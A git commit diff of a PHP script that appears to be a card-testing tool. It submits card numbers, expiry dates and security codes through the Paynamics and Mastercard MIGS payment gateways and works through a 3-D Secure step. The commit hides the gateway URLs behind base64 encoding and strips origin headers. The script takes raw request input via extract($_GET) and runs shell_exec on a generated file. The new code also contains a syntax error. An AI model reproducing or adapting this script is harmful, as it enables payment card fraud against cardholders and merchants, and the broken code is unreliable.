937df7e6cdee678275ca23b6e91832f7e408c80e
Raizo <pnrjason@gmail.com>
2022-12-20 00:11:25 +0800

    tttt

--- runner.php
+++ runner.php
@@ -19,10 +19,10 @@ extract($_GET);
 if(($I = json_decode($data))->session) {
   
   extract(set_card($card, 4)); 
-  $type = $cc[0] == 4 ? 'visa' : ($cc[0] == '5' ? 'mastercard' : d('error', '[Card Type]'));
+  $type = $cc[0] == 4 ? base64_decode("dmlzYQ==") : ($cc[0] == '5' ? base64_decode("bWFzdGVyY2FyZA==") : d('error', '[Card Type]'));
   $tries = 0;
   $C = json_decode(
-    rq('https://nodecde1.paynamics.net/possible/transaction/cc/fetch/ui/config/data1='.$I->data1.'&data2='.$t)
+    rq(base64_decode("aHR0cHM6Ly9ub2RlY2RlMS5wYXluYW1pY3MubmV0L3Bvc3NpYmxlL3RyYW5zYWN0aW9uL2NjL2ZldGNoL3VpL2NvbmZpZy9kYXRhMT0=").$I->data1.'&data2='.$t)
   );
   
   $x  = random(10).'.txt';
@@ -42,12 +42,11 @@ if(($I = json_decode($data))->session) {
   $e_cc = trim(shell_exec('node '.$x)); 
   unlink($x);
 
-  $trnx = json_decode(rq('https://nodecde1.paynamics.net/possible/transaction/wf/cc/transact_cvv_off/token?data1='.$I->data1.'&data2='.$t, [
+  $trnx = json_decode(rq(base64_decode('aHR0cHM6Ly9ub2RlY2RlMS5wYXluYW1pY3MubmV0L3Bvc3NpYmxlL3RyYW5zYWN0aW9uL3dmL2NjL3RyYW5zYWN0X2N2dl9vZmYvdG9rZW4/ZGF0YTE9').$I->data1.'&data2='.$t, [
     'postfields' => '{"agreement":true,"session":"'.$I->session.'","moment":"'.$I->moment.'","encData":"'.$e_cc.'"}',
     'httpheader' => [
       'accept: application/json',
       'content-type: application/json',
-      'origin: https://shield.paynamics.net',
       'x-request-id: '.$C->trxData->request_id
     ]
   ]), 1);
@@ -58,12 +57,11 @@ if(($I = json_decode($data))->session) {
   } else {
     d('error', '[transaction] Session Expired');
   }
-  $mgs = rq('https://migs.mastercard.com.au/vpcpay', [
+  $mgs = rq(base64_decode('aHR0cHM6Ly9taWdzLm1hc3RlcmNhcmQuY29tLmF1L3ZwY3BheQ=='), [
     'header' => 1,
     'followlocation' => 1,
     'postfields' => "vpc_AccessCode=$vpc_AccessCode&vpc_Amount=$vpc_Amount&vpc_CardExp=$vpc_CardExp&vpc_CardNum=$vpc_CardNum&vpc_CardSecurityCode=$vpc_CardSecurityCode&vpc_Command=pay&vpc_Gateway=ssl&vpc_MerchTxnRef=$vpc_MerchTxnRef&vpc_Merchant=$vpc_Merchant&vpc_OrderInfo=$vpc_OrderInfo&vpc_ReturnURL=".urlencode($vpc_ReturnURL)."&vpc_Version=1&vpc_card=$vpc_card&vpc_SecureHash=$vpc_SecureHash&vpc_SecureHashType=SHA256&vpc_Currency=PHP",
     'httpheader' => [
-      'Host: migs.mastercard.com.au',
       'Connection: keep-alive',
       'Cache-Control: max-age=0',
       'Upgrade-Insecure-Requests: 1',
@@ -81,7 +79,6 @@ if(($I = json_decode($data))->session) {
   [
     'postfields' => http_build_query($p),
     'httpheader' => [
-      'Origin: https://migs.mastercard.com.au',
       'Content-Type: application/x-www-form-urlencoded',
       'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
       'Accept-Language: en-US,en;q=0.9'
@@ -191,9 +188,7 @@ function secu ($opt) {
   $I = rq('https://www.securesuite.co.uk/cba/tdsecure/intro.jsp',
     [
       'postfields' => "page_timeout_flag=false&c_flash=&a_data=pm_fpua%253Dmozilla%252F5.0%2520%28windows%2520nt%252010.0%253B%2520win64%253B%2520x64%29%2520applewebkit%252F537.36%2520%28khtml%252C%2520like%2520gecko%29%2520chrome%252F100.0.4896.79%2520safari%252F537.36%257C5.0%2520%28Windows%2520NT%252010.0%253B%2520Win64%253B%2520x64%29%2520AppleWebKit%252F537.36%2520%28KHTML%252C%2520like%2520Gecko%29%2520Chrome%252F100.0.4896.79%2520Safari%252F537.36%257CWin32%255E%7E%255Epm_fpsc%253D24%257C1920%257C1080%257C1040%255E%7E%255Epm_fpsw%253D%255E%7E%255Epm_fptz%253D8%255E%7E%255Elang%253Den-US%255E%7E%255Esyslang%253D%255E%7E%255Euserlang%253D%255E%7E%255Epm_fpjv%253Dfalse%255E%7E%255Epm_fpco%253Dtrue%255E%7E%255Epm_fpasw%253Dxyswrvqvqvkfchqiecbgw48epnz58epn%257Cevxlly58ev379%257Csjechwyswlly5co%257Cohdhqieix48ephjx%255E%7E%255Epm_fpan%253DNetscape%255E%7E%255Epm_fpacn%253DMozilla%255E%7E%255Epm_fpol%253Dtrue%255E%7E%255Epm_fposp%253D%255E%7E%255Epm_fpup%253D%255E%7E%255Epm_fpsaw%253D1920%255E%7E%255Epm_fpspd%253D24%255E%7E%255Epm_fpsbd%253D%255E%7E%255Epm_fpsdx%253D%255E%7E%255Epm_fpsdy%253D%255E%7E%255Epm_fpslx%253D%255E%7E%255Epm_fpsly%253D%255E%7E%255Epm_fpsfse%253D%255E%7E%255Epm_fpsui%253D&NF=noflash&FV=noflash&ERROR2=noflash&html5_data=H.84046676.9190569434&user_action=dummy&cy_param_0=".$cyP,
-      'httpheader' => [
-        'Host: www.securesuite.co.uk',
-        'Origin: https://migs.mastercard.com.au',
+      'httpheader' => [,
         'Content-Type: application/x-www-form-urlencoded',
         'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
         'Accept-Language: en-US,en;q=0.9'
